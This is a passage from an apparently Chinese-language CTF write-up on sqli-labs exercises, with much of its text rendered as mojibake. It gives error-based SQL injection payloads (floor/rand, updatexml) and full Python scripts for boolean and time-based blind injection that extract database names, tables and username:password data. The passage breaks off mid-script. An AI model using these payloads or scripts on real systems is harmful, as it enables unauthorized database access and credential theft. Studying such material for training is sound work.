æ’å…¥æ–°è¡Œï¼Œè®¡æ•°è®¾ä¸º 1ï¼›<br>æœ€ç»ˆè¿”å›ä¸´æ—¶è¡¨çš„ç»Ÿè®¡ç»“æœã€‚<br>rand() åœ¨ group by ä¸­çš„ â€œå¤šæ¬¡æ‰§è¡Œâ€ ç‰¹æ€§<br>MySQL å¯¹ group by ä¸­çš„ rand() æœ‰ä¸ªç‰¹æ®Šå¤„ç†ï¼šåœ¨ä¸´æ—¶è¡¨ä¸­æ£€æŸ¥ &#x2F; æ’å…¥æ—¶ï¼Œä¼šä¸¤æ¬¡è®¡ç®— rand() çš„å€¼ï¼ˆä¸€æ¬¡ç”¨äºæ£€æŸ¥ä¸»é”®æ˜¯å¦å­˜åœ¨ï¼Œä¸€æ¬¡ç”¨äºæ’å…¥æ–°è¡Œï¼‰ã€‚å¦‚æœ rand() æ˜¯å›ºå®šç§å­ï¼ˆå¦‚ rand(0)ï¼‰ï¼Œä¸¤æ¬¡è®¡ç®—çš„ç»“æœå¯èƒ½ä¸ä¸€è‡´ï¼Œè¿™æ˜¯è§¦å‘å†²çªçš„æ ¸å¿ƒ<br> Duplicate entryÂ é”™è¯¯<br>MySQL ä¸´æ—¶è¡¨çš„ä¸»é”®æ˜¯å”¯ä¸€çš„ï¼Œè‹¥å°è¯•æ’å…¥<strong>é‡å¤çš„ä¸»é”®å€¼</strong>ï¼Œä¼šè§¦å‘Â <code>Duplicate entry &#39;xxx&#39; for key &#39;group_key&#39;</code>Â é”™è¯¯ï¼Œä¸”é”™è¯¯ä¿¡æ¯ä¸­ä¼šæ˜ç¡®æ˜¾ç¤º â€œé‡å¤çš„ä¸»é”®å€¼ xxxâ€â€”â€” è¿™å°±æ˜¯æ•æ„Ÿæ•°æ®çš„æ³„éœ²å…¥å£ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°åº“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat(0x7e,(select column_name from </span><br><span class="line">information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°åˆ—</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from `users` limit 2,1),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>
<p>æœ€åæ˜¯æ•°æ®<br>ç”¨ä¸Šé¢çš„updatexmlè·¯å¾„æŠ¥é”™å†åšä¸€é</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,concat(0x7e,(select  schema_name from information_schema.schemata limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
<p>åº“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
<p>è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
<p>åˆ—</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from `users` limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
<p>æ•°æ®<br>extractvalue()ä½¿ç”¨æ–¹æ³•ç±»ä¼¼ ä¸Šé¢æœ‰å†™<br>åªä¸è¿‡æ˜¯ EXTRACTVALUE(xml_doc, xpath_expr)æŸ¥ XML é‡Œçš„æŸä¸ªå†…å®¹ UPDATEXML(xml_doc, xpath_expr, new_value) æ”¹ XML é‡Œçš„æŸä¸ªå†…å®¹</p>
<ul>
<li><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4></li>
</ul>
<ol start="5">
<li>ç»§ç»­æ¥ä¸Šå‰é¢ç¬¬äº”å…³çš„å†…å®¹ è´´ä¸Šæ”¹è¿‡åçš„è„šæœ¬</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line">flag=&quot;You are in...........&quot;  </span><br><span class="line">a_url=&quot;http://80-d3ec6b44-9a8a-45e9-b74a-f92c243b95af.challenge.ctfplus.cn/Less-5/?id=&quot;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def is_true(payload):  </span><br><span class="line">    try:  </span><br><span class="line">        # åŠ è¶…æ—¶ï¼Œé¿å…å¡ä½ï¼›å…³é—­é‡å®šå‘ï¼Œé˜²æ­¢å¹²æ‰°  </span><br><span class="line">        resp = requests.get(f&quot;&#123;a_url&#125;&#123;payload&#125;&quot;, timeout=5, allow_redirects=False)  </span><br><span class="line">        return flag in resp.text  </span><br><span class="line">    except Exception as e:  </span><br><span class="line">        # æ‰“å°å¼‚å¸¸ï¼Œæ–¹ä¾¿è°ƒè¯•  </span><br><span class="line">        print(f&quot;è¯·æ±‚å‡ºé”™: &#123;e&#125;&quot;)  </span><br><span class="line">        return False  </span><br><span class="line">  </span><br><span class="line"># è·å–ç›®æ ‡å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆå¦‚æ•°æ®åº“åé•¿åº¦ã€è¡¨åé•¿åº¦ï¼‰  </span><br><span class="line">def get_length(name):  </span><br><span class="line">    # å¾ªç¯å˜é‡åæ”¹ä¸ºlen_numï¼Œé¿å…å’Œå‡½æ•°åé‡å  </span><br><span class="line">    for len_num in range(1, 100):  </span><br><span class="line">        payload = f&quot;1&#x27; and length((&#123;name&#125;))=&#123;len_num&#125;--+&quot;  </span><br><span class="line">        if is_true(payload):  </span><br><span class="line">            print(f&quot;[&#123;name&#125;] é•¿åº¦: &#123;len_num&#125;&quot;)  </span><br><span class="line">            return len_num  </span><br><span class="line">    return 0  </span><br><span class="line">  </span><br><span class="line"># é€å­—ç¬¦çˆ†ç ´ç›®æ ‡å­—ç¬¦ä¸²ï¼ˆæ ¸å¿ƒç›²æ³¨é€»è¾‘ï¼‰  </span><br><span class="line">def get_string(name, len_num):  </span><br><span class="line">    result = &quot;&quot;  </span><br><span class="line">    print(f&quot;å¼€å§‹çˆ†ç ´ [&#123;name&#125;]...&quot;)  </span><br><span class="line">    for i in range(1, len_num + 1):  </span><br><span class="line">        # ASCIIèŒƒå›´32-126ï¼ˆå¯æ‰“å°å­—ç¬¦ï¼‰  </span><br><span class="line">        for asc in range(32, 127):  </span><br><span class="line">            payload = f&quot;1&#x27; and ascii(substr((&#123;name&#125;),&#123;i&#125;,1))=&#123;asc&#125;--+&quot;  </span><br><span class="line">            if is_true(payload):  </span><br><span class="line">                result += chr(asc)  </span><br><span class="line">                # å®æ—¶æ‰“å°è¿›åº¦ï¼Œæ–¹ä¾¿è°ƒè¯•  </span><br><span class="line">                print(f&quot;\rå½“å‰è¿›åº¦: &#123;result&#125;&quot;, end=&quot;&quot;)  </span><br><span class="line">                break  </span><br><span class="line">    print()  # æ¢è¡Œ  </span><br><span class="line">    return result  </span><br><span class="line">  </span><br><span class="line"># ä¸»ç¨‹åºå…¥å£ï¼ˆå¿…é¡»åŠ ï¼Œå¦åˆ™å‡½æ•°å®šä¹‰å’Œæ‰§è¡Œä»£ç ä¼šæ··åœ¨ä¸€èµ·ï¼‰  </span><br><span class="line">if __name__ == &quot;__main__&quot;:  </span><br><span class="line">    # ========== 1. çˆ†ç ´æ•°æ®åº“å ==========    db_len = get_length(&quot;database()&quot;)  </span><br><span class="line">    if db_len == 0:  </span><br><span class="line">        print(&quot;æ•°æ®åº“åé•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)  </span><br><span class="line">        exit()  </span><br><span class="line">    db_name = get_string(&quot;database()&quot;, db_len)  </span><br><span class="line">    print(f&quot;âœ… æ•°æ®åº“å: &#123;db_name&#125;&quot;)  </span><br><span class="line">  </span><br><span class="line">    # ========== 2. çˆ†ç ´å½“å‰åº“çš„æ‰€æœ‰è¡¨å ==========    tables_sql = f&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;&#123;db_name&#125;&#x27;&quot;  </span><br><span class="line">    tables_len = get_length(tables_sql)  </span><br><span class="line">    if tables_len == 0:  </span><br><span class="line">        print(&quot;è¡¨åé•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)  </span><br><span class="line">        exit()  </span><br><span class="line">    tables = get_string(tables_sql, tables_len)  </span><br><span class="line">    print(f&quot;âœ… æ‰€æœ‰è¡¨å: &#123;tables&#125;&quot;)  </span><br><span class="line">    # æå–ç›®æ ‡è¡¨ï¼ˆä¼˜å…ˆusersï¼Œæ— åˆ™å–ç¬¬ä¸€ä¸ªè¡¨ï¼‰  </span><br><span class="line">    table_list = tables.split(&#x27;,&#x27;)  # æ‹†åˆ†è¡¨åå­—ç¬¦ä¸²ä¸ºåˆ—è¡¨  </span><br><span class="line">    target_table = &quot;users&quot; if &quot;users&quot; in table_list else table_list[0]  </span><br><span class="line">    print(f&quot;ğŸ” é€‰å®šç›®æ ‡è¡¨: &#123;target_table&#125;&quot;)  </span><br><span class="line">  </span><br><span class="line">    # ========== 3. çˆ†ç ´ç›®æ ‡è¡¨çš„æ‰€æœ‰åˆ—å ==========    cols_sql = f&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&#123;db_name&#125;&#x27; and table_name=&#x27;&#123;target_table&#125;&#x27;&quot;  </span><br><span class="line">    cols_len = get_length(cols_sql)  </span><br><span class="line">    if cols_len == 0:  </span><br><span class="line">        print(&quot;åˆ—åé•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)  </span><br><span class="line">        exit()  </span><br><span class="line">    cols = get_string(cols_sql, cols_len)  </span><br><span class="line">    print(f&quot;âœ… ç›®æ ‡è¡¨åˆ—å: &#123;cols&#125;&quot;)  </span><br><span class="line">    # æå–ç›®æ ‡åˆ—ï¼ˆä¼˜å…ˆusername/passwordï¼Œæ— åˆ™å–å‰ä¸¤åˆ—ï¼‰  </span><br><span class="line">    col_list = cols.split(&#x27;,&#x27;)  </span><br><span class="line">    target_cols = [c for c in [&quot;username&quot;, &quot;password&quot;] if c in col_list]  </span><br><span class="line">    if not target_cols:  # æ— åˆ™å–å‰ä¸¤åˆ—  </span><br><span class="line">        target_cols = col_list[:2]  </span><br><span class="line">    print(f&quot;ğŸ” é€‰å®šç›®æ ‡åˆ—: &#123;target_cols&#125;&quot;)  </span><br><span class="line">  </span><br><span class="line">    # ========== 4. çˆ†ç ´ç›®æ ‡åˆ—çš„æ•°æ® ==========    for col in target_cols:  </span><br><span class="line">        data_sql = f&quot;select group_concat(&#123;col&#125;) from &#123;target_table&#125;&quot;  </span><br><span class="line">        data_len = get_length(data_sql)  </span><br><span class="line">        if data_len == 0:  </span><br><span class="line">            print(f&quot;&#123;col&#125; æ•°æ®é•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)  </span><br><span class="line">            continue  </span><br><span class="line">        data = get_string(data_sql, data_len)  </span><br><span class="line">        print(f&quot;âœ… &#123;col&#125; æ•°æ®: &#123;data&#125;&quot;)</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>â€œé—­åˆ æ”¹è„šæœ¬</li>
<li>â€œ)) é—­åˆ</li>
<li>â€˜é—­åˆ</li>
</ol>
<ul>
<li><h4 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h4></li>
</ul>
<p>ç­‰äºæ²¡æœ‰å›æ˜¾äº† ä¸ç®¡æ€ä¹ˆæ · éƒ½æ˜¯ç›¸åŒçš„ç•Œé¢  å½“æ—¶è¿˜æ˜¯æ²¡å¤ªæ‡‚ å…¶å®ä¹Ÿå°±æ˜¯å¯¹ä¸ä¸å¯¹æ¥é€ æˆä¸åŒçš„è®¿é—®ç•Œé¢ ä»è€Œæ…¢æ…¢æ‹¼æ¥å‡ºå­—ç¬¦ ä¸¤ä¸ªæ ¸å¿ƒå‡½æ•°é…åˆ<br> <code>SLEEP(n)</code>ï¼šè®© SQL æ‰§è¡Œå¡<code>n</code>ç§’ï¼ˆæ¯”å¦‚<code>SLEEP(5)</code>å°±æ˜¯å¡ 5 ç§’ï¼‰ï¼›<br><code>IF(æ¡ä»¶, æ‰§è¡Œ1, æ‰§è¡Œ2)</code>ï¼šæ¡ä»¶æˆç«‹åˆ™æ‰§è¡Œ 1ï¼Œå¦åˆ™æ‰§è¡Œ 2ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time  # æ–°å¢ï¼šç”¨äºè®¡ç®—å“åº”è€—æ—¶</span><br><span class="line">a_url = &quot;http://80-d3ec6b44-9a8a-45e9-b74a-f92c243b95af.challenge.ctfplus.cn/Less-9/?id=&quot;</span><br><span class="line"></span><br><span class="line"># æ ¸å¿ƒï¼šåˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ï¼ˆæ—¶é—´ç›²æ³¨é å“åº”è€—æ—¶ï¼‰</span><br><span class="line"># æ¡ä»¶æˆç«‹ â†’ æ‰§è¡ŒSLEEP(3) â†’ å“åº”è€—æ—¶&gt;3ç§’ï¼›æ¡ä»¶ä¸æˆç«‹ â†’ ç«‹åˆ»è¿”å›</span><br><span class="line">def is_true(payload):</span><br><span class="line">    try:</span><br><span class="line">        start_time = time.time()  # è®°å½•è¯·æ±‚å¼€å§‹æ—¶é—´</span><br><span class="line">        # è¶…æ—¶è®¾ä¸º5ç§’ï¼ˆå¤§äºSLEEPçš„3ç§’ï¼Œé¿å…æå‰è¶…æ—¶ï¼‰</span><br><span class="line">        resp = requests.get(f&quot;&#123;a_url&#125;&#123;payload&#125;&quot;, timeout=5, allow_redirects=False)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        cost_time = end_time - start_time  # è®¡ç®—è€—æ—¶</span><br><span class="line">        # è€—æ—¶è¶…è¿‡3ç§’ â†’ æ¡ä»¶æˆç«‹</span><br><span class="line">        return cost_time &gt; 3</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        # è¶…æ—¶ä¹Ÿè¯´æ˜æ¡ä»¶æˆç«‹ï¼ˆSLEEPå¯¼è‡´è¶…æ—¶ï¼‰</span><br><span class="line">        return True</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;è¯·æ±‚å‡ºé”™: &#123;e&#125;&quot;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"># è·å–ç›®æ ‡å­—ç¬¦ä¸²é•¿åº¦ï¼ˆæ—¶é—´ç›²æ³¨ç‰ˆï¼‰</span><br><span class="line">def get_length(name):</span><br><span class="line">    for len_num in range(1, 100):</span><br><span class="line">        # æ ¸å¿ƒä¿®æ”¹ï¼šIF(é•¿åº¦ç­‰äºlen_num, SLEEP(3), 0)</span><br><span class="line">        payload = f&quot;1&#x27; and IF(length((&#123;name&#125;))=&#123;len_num&#125;, SLEEP(3), 0)--+&quot;</span><br><span class="line">        if is_true(payload):</span><br><span class="line">            print(f&quot;[&#123;name&#125;] é•¿åº¦: &#123;len_num&#125;&quot;)</span><br><span class="line">            return len_num</span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line"># é€å­—ç¬¦çˆ†ç ´ç›®æ ‡å­—ç¬¦ä¸²ï¼ˆæ—¶é—´ç›²æ³¨ç‰ˆï¼‰</span><br><span class="line">def get_string(name, len_num):</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    print(f&quot;å¼€å§‹çˆ†ç ´ [&#123;name&#125;]...&quot;)</span><br><span class="line">    for i in range(1, len_num + 1):</span><br><span class="line">        # ASCIIèŒƒå›´32-126ï¼ˆå¯æ‰“å°å­—ç¬¦ï¼‰</span><br><span class="line">        for asc in range(32, 127):</span><br><span class="line">            # æ ¸å¿ƒä¿®æ”¹ï¼šIF(å­—ç¬¦çš„ASCIIç­‰äºasc, SLEEP(3), 0)</span><br><span class="line">            payload = f&quot;1&#x27; and IF(ascii(substr((&#123;name&#125;),&#123;i&#125;,1))=&#123;asc&#125;, SLEEP(3), 0)--+&quot;</span><br><span class="line">            if is_true(payload):</span><br><span class="line">                result += chr(asc)</span><br><span class="line">                # å®æ—¶æ‰“å°è¿›åº¦</span><br><span class="line">                print(f&quot;\rå½“å‰è¿›åº¦: &#123;result&#125;&quot;, end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">    print()  # æ¢è¡Œ</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"># ä¸»ç¨‹åºå…¥å£</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # ========== 1. çˆ†ç ´æ•°æ®åº“å ==========</span><br><span class="line">    db_len = get_length(&quot;database()&quot;)</span><br><span class="line">    if db_len == 0:</span><br><span class="line">        print(&quot;æ•°æ®åº“åé•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    db_name = get_string(&quot;database()&quot;, db_len)</span><br><span class="line">    print(f&quot;âœ… æ•°æ®åº“å: &#123;db_name&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # ========== 2. çˆ†ç ´å½“å‰åº“çš„æ‰€æœ‰è¡¨å ==========</span><br><span class="line">    tables_sql = f&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;&#123;db_name&#125;&#x27;&quot;</span><br><span class="line">    tables_len = get_length(tables_sql)</span><br><span class="line">    if tables_len == 0:</span><br><span class="line">        print(&quot;è¡¨åé•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    tables = get_string(tables_sql, tables_len)</span><br><span class="line">    print(f&quot;âœ… æ‰€æœ‰è¡¨å: &#123;tables&#125;&quot;)</span><br><span class="line">    # æå–ç›®æ ‡è¡¨ï¼ˆä¼˜å…ˆusersï¼Œæ— åˆ™å–ç¬¬ä¸€ä¸ªè¡¨ï¼‰</span><br><span class="line">    table_list = tables.split(&#x27;,&#x27;)</span><br><span class="line">    target_table = &quot;users&quot; if &quot;users&quot; in table_list else table_list[0]</span><br><span class="line">    print(f&quot;ğŸ” é€‰å®šç›®æ ‡è¡¨: &#123;target_table&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # ========== 3. çˆ†ç ´ç›®æ ‡è¡¨çš„æ‰€æœ‰åˆ—å ==========</span><br><span class="line">    cols_sql = f&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&#123;db_name&#125;&#x27; and table_name=&#x27;&#123;target_table&#125;&#x27;&quot;</span><br><span class="line">    cols_len = get_length(cols_sql)</span><br><span class="line">    if cols_len == 0:</span><br><span class="line">        print(&quot;åˆ—åé•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    cols = get_string(cols_sql, cols_len)</span><br><span class="line">    print(f&quot;âœ… ç›®æ ‡è¡¨åˆ—å: &#123;cols&#125;&quot;)</span><br><span class="line">    # æå–ç›®æ ‡åˆ—ï¼ˆä¼˜å…ˆusername/passwordï¼Œæ— åˆ™å–å‰ä¸¤åˆ—ï¼‰</span><br><span class="line">    col_list = cols.split(&#x27;,&#x27;)</span><br><span class="line">    target_cols = [c for c in [&quot;username&quot;, &quot;password&quot;] if c in col_list]</span><br><span class="line">    if not target_cols:</span><br><span class="line">        target_cols = col_list[:2]</span><br><span class="line">    print(f&quot;ğŸ” é€‰å®šç›®æ ‡åˆ—: &#123;target_cols&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # ========== 4. çˆ†ç ´ç›®æ ‡åˆ—çš„æ•°æ® ==========</span><br><span class="line">    for col in target_cols:</span><br><span class="line">        data_sql = f&quot;select group_concat(&#123;col&#125;) from &#123;target_table&#125;&quot;</span><br><span class="line">        data_len = get_length(data_sql)</span><br><span class="line">        if data_len == 0:</span><br><span class="line">            print(f&quot;&#123;col&#125; æ•°æ®é•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)</span><br><span class="line">            continue</span><br><span class="line">        data = get_string(data_sql, data_len)</span><br><span class="line">        print(f&quot;âœ… &#123;col&#125; æ•°æ®: &#123;data&#125;&quot;)</span><br></pre></td></tr></table></figure>
<ol start="10">
<li>â€œé—­åˆ</li>
<li>â€˜æ­£å¸¸æ³¨å…¥ åº”è¯¥æ˜¯ ç±»ä¼¼äºselect * from users where username&#x3D;â€™â€™ and password&#x3D;â€™â€™è¿™æ ·å­çš„éªŒè¯ æŠŠåé¢æ³¨é‡Šäº† æ‰€ä»¥å¯†ç éšä¾¿è¾“å…¥</li>
<li>â€œ)é—­åˆ</li>
<li>æ²¡æœ‰å›æ˜¾äº† å¯ä»¥è€ƒè™‘æ—¶é—´ç›²æ³¨ æˆ‘æŠ¥é”™åšçš„ â€˜)é—­åˆ</li>
<li>â€œé—­åˆ</li>
<li>æŠ¥é”™ä¹Ÿæ²¡æ³•äº† é‚£å°±æ—¶é—´ç›²æ³¨ æŠ“åŒ…çœ‹åˆ°å‘çš„æ˜¯postè¯·æ±‚</li>
</ol>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time  # ç”¨äºè®¡ç®—å“åº”è€—æ—¶</span><br><span class="line"></span><br><span class="line"># åŸºç¡€URLï¼ˆå»æ‰åŸGETçš„?id=ï¼Œå› ä¸ºPOSTå‚æ•°åœ¨è¡¨å•é‡Œï¼‰</span><br><span class="line">a_url = &quot;http://80-ce1a9e65-c341-47bd-b72c-c43dc97f3113.challenge.ctfplus.cn/Less-15/&quot;</span><br><span class="line"></span><br><span class="line"># æ 